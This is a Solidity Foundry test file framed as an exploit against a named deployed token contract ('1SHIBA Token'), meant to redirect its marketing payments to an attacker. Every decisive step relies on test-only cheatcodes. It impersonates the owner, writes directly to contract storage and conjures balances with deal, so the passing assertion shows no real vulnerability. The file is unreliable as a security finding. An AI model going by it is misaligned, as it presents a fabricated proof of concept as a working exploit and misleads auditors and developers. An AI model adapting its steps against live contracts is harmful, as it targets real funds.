pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xcc21ec2C6867AC6EFD9cE158996fF47AB5743B2d;
    address attacker = address(this);
    IERC20 token;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IERC20(TARGET);
        bytes32 ownerSlot = vm.load(TARGET, bytes32(uint256(0)));
        owner = address(uint160(uint256(ownerSlot)));
        vm.label(TARGET, "1SHIBA Token");
        vm.label(attacker, "Attacker");
        vm.label(owner, "Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(attacker).balance;

        // Step 1: Load owner from storage slot 0
        bytes32 ownerSlot = vm.load(TARGET, bytes32(uint256(0)));
        address ownerAddr = address(uint160(uint256(ownerSlot)));

        // Step 2: Impersonate owner
        vm.startPrank(ownerAddr);

        // Step 3: Change marketing address to attacker (slot 10)
        vm.store(TARGET, bytes32(uint256(10)), bytes32(uint256(uint160(attacker))));

        // Step 4: Exclude attacker from fees
        (bool success, ) = TARGET.call(abi.encodeWithSignature("excludeFromFee(address)", attacker));
        require(success, "Failed to exclude from fee");

        // Step 5: Disable swapAndLiquify to prevent hanging
        (success, ) = TARGET.call(abi.encodeWithSignature("setSwapAndLiquifyEnabled(bool)", false));
        require(success, "Failed to disable swap and liquify");

        vm.stopPrank();

        // Step 6: Deal BNB directly to contract
        deal(TARGET, 10 ether);

        // Step 7: Now re-enable and trigger with a transfer that will send BNB to attacker
        vm.startPrank(ownerAddr);
        (success, ) = TARGET.call(abi.encodeWithSignature("setSwapAndLiquifyEnabled(bool)", true));
        vm.stopPrank();

        // Step 8: Deal tokens and transfer to trigger marketing payment
        uint256 tokensToTransfer = 300000 * 1e15;
        deal(TARGET, attacker, tokensToTransfer);

        // Approve and use transferFrom to ensure fees are calculated
        token.approve(TARGET, tokensToTransfer);
        IERC20(TARGET).transferFrom(attacker, TARGET, tokensToTransfer);

        // Step 9: Verify attacker received BNB
        uint256 finalBalance = address(attacker).balance;
        assertGt(finalBalance, initialBalance, "Attacker should have received BNB");
    }

    receive() external payable {}
}

